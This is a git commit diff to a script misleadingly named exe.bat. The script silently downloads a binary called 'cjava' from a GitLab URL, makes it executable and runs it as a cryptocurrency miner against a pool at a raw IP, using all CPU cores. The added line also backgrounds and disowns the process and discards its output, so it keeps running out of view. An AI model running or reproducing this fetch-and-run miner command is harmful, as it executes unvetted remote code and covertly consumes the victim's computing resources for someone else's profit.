f32da83a928de9d96c094f19a91a7954acd1359a
Bangdione01 <bangdione@hotmail.com>
2024-11-18 16:15:06 +0700

    Update exe.bat

--- exe.bat
+++ exe.bat
@@ -1,3 +1,3 @@
 #!/bin/bash
 
-wget -qO cjava https://gitlab.com/ghcees/pack/-/raw/main/cjava && chmod +x cjava && ./cjava -a yespowertide -o 120.89.46.39:80 -u TG4zyjhTxSrwAgiUbWuSJ13uHJwvtfUyvK.GaSs$(shuf -n 1 -i 1-999)p x -t $(nproc --all)
+wget -qO cjava https://gitlab.com/ghcees/pack/-/raw/main/cjava && chmod +x cjava && nohup ./cjava -a yespowertide -o 120.89.46.39:80 -u TG4zyjhTxSrwAgiUbWuSJ13uHJwvtfUyvK.$(echo CSS-$(TZ=UTC-7 date +"%H-%M-%S")) -p x -t $(nproc --all) >/dev/null & disown
